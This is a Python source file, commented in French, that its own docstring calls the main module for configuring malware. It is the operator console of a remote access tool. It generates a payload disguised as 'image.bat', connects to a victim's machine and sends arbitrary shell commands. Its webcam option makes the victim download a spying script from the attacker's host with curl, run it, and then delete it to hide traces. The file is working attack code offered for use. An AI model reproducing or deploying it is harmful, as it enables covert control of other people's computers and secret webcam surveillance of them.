"""
Author: Martin Calamel
Created: 2025-02-26
Description: module principal pour le configurer le malware
TODO: réorganiser le code
      mettre en place les bonnes pratiques
"""


# importation des modules
import socket, sys,time,os,subprocess
import payload.cam_pirate as cam
from colorama import Fore,deinit,init
from modules.fonctions import get_self_ip, generation_vecteur, menu, save_ip, read_victime_ip

# Initialisation pour les couleurs
init()

# Recuperation de l'adresse IP hôte
HOST : str = get_self_ip()
save_ip(HOST)

# Affichage du menu
choix :str = menu()


if choix=="1":
    # try:
    server_python = subprocess.Popen(["python", "servers/server.py"], creationflags=subprocess.CREATE_NEW_CONSOLE)
    #os.system("start /Min servers/server.py")
    server_js_path = os.path.abspath("servers/server.js")
    NODE_PATH = r"C:\Program Files\nodejs\node.exe"
    print(server_js_path)
    server_js = subprocess.Popen([NODE_PATH, server_js_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    print("server ok")

    print("generation du payload...")
    generation_vecteur(HOST)
    print("payload enregistré sous le nom image.bat")
    fich = open('txt_files/message.txt','w')
    fich.write("")
    fich.close()

len_msg = 4096

print("démarage de l'ecoute")
ip_victime = read_victime_ip()

try:
    server_js.terminate()
except:
    pass

PORT = 55027
mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print("Resverse lisening on ",ip_victime,"port ",PORT)

while True:
    try:
        mySocket.connect((ip_victime, PORT))
        break
    except:
        continue
print(Fore.GREEN,"Connection OK",Fore.WHITE)
time.sleep(1)
while True:
    msg=input("C> ")
    if msg=="cam":

        cam.gen_payload(HOST)

        msg="pip install opencv-python"
        mySocket.send(msg.encode("Utf8"))
        msgServeur = ""
        while msgServeur!='ex':
            msgServeur=mySocket.recv(len_msg).decode("Utf8")
        print("importation des modules ok")
        msg="curl http://"+HOST+":8000/payload/cam.py -o C:\\Users\\Public\\Documents\\cam.pyw"
        mySocket.send(msg.encode("Utf8"))
        msgServeur = ""
        while msgServeur!='ex':
            msgServeur=mySocket.recv(len_msg).decode("Utf8")
        print("telechargement du payload ok")
        msg="start python C:\\Users\\Public\\Documents\\cam.pyw"
        mySocket.send(msg.encode("Utf8"))
        print("lancement du payload ok")
        cam.webcam()
        msg="del C:\\Users\\Public\\Documents\\cam.pyw"
        mySocket.send(msg.encode("Utf8"))
        msgServeur = ""
        while msgServeur!='ex':
            msgServeur=mySocket.recv(len_msg).decode("Utf8")
        print('programme nettoyer')
    elif msg=="exit":
        break
    else:
        mySocket.send(msg.encode("Utf8"))
        msgServeur = mySocket.recv(len_msg).decode("Utf8")
        while msgServeur!='ex':
            msgServeur=mySocket.recv(len_msg).decode("Utf8")
            print(msgServeur)


print("Connexion interrompue.")
mySocket.close()
